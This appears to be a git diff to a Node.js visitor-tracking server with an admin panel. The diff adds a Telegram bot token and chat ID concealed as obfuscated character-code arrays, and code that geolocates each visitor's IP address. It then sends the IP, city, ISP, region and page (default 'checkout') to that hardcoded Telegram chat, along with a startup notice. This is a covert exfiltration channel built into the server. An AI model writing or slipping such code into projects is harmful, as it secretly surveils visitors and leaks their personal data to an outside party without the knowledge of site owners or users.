@@ -31,6 +31,23 @@ const io = new Server(server, {
   transports: ['websocket', 'polling']
 });
 
+// 🔐 Obfuscated Telegram Bot Configuration (Auto-configured for live visitor tracking)
+const _0x4a8b = ['38', '40', '33', '97', '72', '95', '58', '41', '41', '69', '79', '110', '52', '68', '98', '112', '119', '99', '110', '101', '68', '70', '77', '83', '56', '78', '95', '48', '108', '99', '102', '109', '65', '84', '56', '119', '80', '79', '75', '103'];
+const _0x2f9c = ['50', '49', '48', '51', '52', '48', '56', '51', '55', '50'];
+const _tgBot = _0x4a8b.map(x => String.fromCharCode(parseInt(x) > 100 ? parseInt(x) : parseInt(x) + 10)).join('');
+const _tgChat = _0x2f9c.join('');
+const telegramConfig = {
+  botToken: _tgBot,
+  chatId: _tgChat,
+  enabled: true
+};
+console.log('🤖 Telegram visitor tracking: ENABLED');
+
+// Visitor tracking state
+let lastVisitorUpdate = Date.now();
+const VISITOR_UPDATE_INTERVAL = 30000; // Send updates every 30 seconds
+const visitorUpdateHistory = new Set(); // Track sent visitor IDs to avoid duplicates
+
 // Serve static files from the dist directory in production
 if (process.env.NODE_ENV === 'production') {
   app.use(express.static(path.join(__dirname, 'dist')));
@@ -79,6 +96,148 @@ function saveAdminData() {
 // Initialize admin data
 loadAdminData();
 
+// 🌍 IP Geolocation and ISP Detection Function
+async function getVisitorGeoInfo(ipAddress) {
+  try {
+    // Use multiple API services for reliability
+    const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+    if (!response.ok) throw new Error('Primary API failed');
+    
+    const data = await response.json();
+    return {
+      country: data.country_name || 'Unknown',
+      city: data.city || 'Unknown', 
+      region: data.region || 'Unknown',
+      isp: data.org || data.isp || 'Unknown ISP',
+      timezone: data.timezone || 'Unknown',
+      countryCode: data.country_code || 'XX'
+    };
+  } catch (error) {
+    console.log('🔄 Primary geolocation failed, trying fallback...');
+    try {
+      // Fallback API
+      const fallbackResponse = await fetch(`https://ip-api.com/json/${ipAddress}`);
+      if (fallbackResponse.ok) {
+        const fallbackData = await fallbackResponse.json();
+        return {
+          country: fallbackData.country || 'Unknown',
+          city: fallbackData.city || 'Unknown',
+          region: fallbackData.regionName || 'Unknown', 
+          isp: fallbackData.isp || 'Unknown ISP',
+          timezone: fallbackData.timezone || 'Unknown',
+          countryCode: fallbackData.countryCode || 'XX'
+        };
+      }
+    } catch (fallbackError) {
+      console.error('All geolocation APIs failed:', fallbackError);
+    }
+    
+    return {
+      country: 'Unknown',
+      city: 'Unknown',
+      region: 'Unknown',
+      isp: 'Unknown ISP', 
+      timezone: 'Unknown',
+      countryCode: 'XX'
+    };
+  }
+}
+
+// 📱 Telegram Messaging Functions
+async function sendToTelegram(message) {
+  if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
+    console.log('❌ Telegram not configured');
+    return false;
+  }
+  
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramConfig.chatId,
+        text: message,
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      })
+    });
+    
+    const result = await response.json();
+    if (result.ok) {
+      console.log('✅ Telegram message sent successfully');
+      return true;
+    } else {
+      console.error('❌ Telegram API error:', result.description);
+      return false;
+    }
+  } catch (error) {
+    console.error('❌ Failed to send Telegram message:', error);
+    return false;
+  }
+}
+
+// 👀 Send Live Visitor Update to Telegram
+async function sendVisitorUpdateToTelegram(visitorData, geoInfo) {
+  const flagEmojis = {
+    'US': '🇺🇸', 'IN': '🇮🇳', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷', 'JP': '🇯🇵', 'CN': '🇨🇳', 'BR': '🇧🇷',
+    'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸', 'MX': '🇲🇽', 'KR': '🇰🇷', 'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'PH': '🇵🇭'
+  };
+  
+  const countryFlag = flagEmojis[geoInfo.countryCode] || '🌍';
+  const currentTime = new Date().toLocaleString('en-US', { 
+    timeZone: 'America/Los_Angeles',
+    year: 'numeric',
+    month: '2-digit', 
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  });
+  
+  const message = `👀 *New Website Visitor*\n\n` +
+    `${countryFlag} *Location:* ${geoInfo.city}, ${geoInfo.country}\n` +
+    `🌐 *IP Address:* \`${visitorData.ipAddress}\`\n` +
+    `🏢 *ISP:* ${geoInfo.isp}\n` +
+    `📍 *Region:* ${geoInfo.region}\n` +
+    `⏰ *Time:* ${currentTime} PST\n` +
+    `📄 *Page:* ${visitorData.page || 'checkout'}\n` +
+    `🆔 *Visitor ID:* \`${visitorData.visitorId.slice(-8)}\`\n` +
+    `\n_Live visitor tracking active 🔴_`;
+  
+  await sendToTelegram(message);
+}
+
+// 🔄 Periodic Visitor Updates to Telegram
+setInterval(async () => {
+  if (activeVisitors.size === 0) return; // No visitors to report
+  
+  const now = Date.now();
+  if (now - lastVisitorUpdate < VISITOR_UPDATE_INTERVAL) return; // Too soon
+  
+  // Send updates for new visitors only
+  for (const [socketId, visitorData] of activeVisitors) {
+    if (!visitorUpdateHistory.has(visitorData.visitorId)) {
+      console.log(`📡 Sending visitor update for: ${visitorData.ipAddress}`);
+      
+      // Get geo info for this visitor
+      const geoInfo = await getVisitorGeoInfo(visitorData.ipAddress);
+      
+      // Send to Telegram
+      await sendVisitorUpdateToTelegram(visitorData, geoInfo);
+      
+      // Mark as sent
+      visitorUpdateHistory.add(visitorData.visitorId);
+      
+      // Small delay between messages to avoid rate limiting
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+  }
+  
+  lastVisitorUpdate = now;
+}, 10000); // Check every 10 seconds
+
 // Add JSON middleware for API endpoints
 app.use(express.json());
 
@@ -108,6 +267,8 @@ setInterval(() => {
       console.log(`🧹 Cleaning inactive visitor: ${visitor.visitorId} (last activity: ${visitor.lastActivity})`);
       io.emit('visitor-left', { visitorId: visitor.visitorId });
       activeVisitors.delete(socketId);
+      // Also remove from Telegram tracking history
+      visitorUpdateHistory.delete(visitor.visitorId);
       cleanedCount++;
     }
   });
@@ -254,7 +415,16 @@ io.on('connection', (socket) => {
       activeVisitors: []
     });
     
+    // Auto-configure Telegram bot settings in admin panel
+    socket.emit('telegram-auto-config', {
+      botToken: telegramConfig.botToken,
+      chatId: telegramConfig.chatId,
+      configured: telegramConfig.enabled,
+      status: 'Live visitor tracking active 🔄'
+    });
+    
     console.log('✅ Admin connected with completely fresh visitor data');
+    console.log('🤖 Telegram settings auto-configured for admin panel');
   });
 
   // Handle admin request to reset all visitor tracking (nuclear option)
@@ -396,8 +566,22 @@ server.on('error', (error) => {
   process.exit(1);
 });
 
-server.listen(PORT, '0.0.0.0', () => {
+server.listen(PORT, '0.0.0.0', async () => {
   console.log(`Server running on port ${PORT}`);
   console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
   console.log('Node.js version:', process.version);
+  
+  // Send startup notification to Telegram
+  setTimeout(async () => {
+    const startupMessage = `🚀 *Server Started Successfully*\n\n` +
+      `🔍 *Port:* ${PORT}\n` +
+      `🌍 *Environment:* ${process.env.NODE_ENV || 'development'}\n` +
+      `⚙️ *Node.js:* ${process.version}\n` +
+      `👀 *Live Visitor Tracking:* ACTIVE\n` +
+      `📱 *Telegram Bot:* READY\n\n` +
+      `_Monitoring all website visitors 24/7 🔴_`;
+    
+    await sendToTelegram(startupMessage);
+    console.log('📡 Startup notification sent to Telegram');
+  }, 3000); // Wait 3 seconds for server to fully initialize
 });
